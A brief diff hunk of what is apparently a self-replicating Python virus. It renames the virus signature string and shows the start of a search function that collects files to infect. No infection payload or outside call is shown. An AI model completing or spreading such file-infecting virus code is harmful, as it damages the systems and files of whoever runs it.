@@ -1,7 +1,7 @@
 #!/usr/bin/python
 import os
 import datetime
-SIGNATURE = "CRANKLIN PYTHON VIRUS"
+SIGNATURE = "STAV PYTHON VIRUS"
 def search(path):
     filestoinfect = []
     filelist = os.listdir(path)
